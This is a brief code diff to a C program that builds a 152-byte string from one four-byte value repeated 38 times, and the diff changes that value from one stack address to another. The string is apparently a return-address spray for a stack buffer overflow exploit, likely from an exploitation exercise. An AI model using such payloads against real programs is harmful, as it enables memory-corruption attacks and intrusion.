@@ -18,7 +18,7 @@ int main(void)
   printf("BB\n");  
   char rt_arr[152] = "";
   for (int i=0; i < 38; i++){
-	strcat(rt_arr, "\xf4\xfa\xff\xbf");
+	strcat(rt_arr, "\x74\xfb\xff\xbf");
   }
 
   printf("rt_arr is : %s\n", rt_arr);
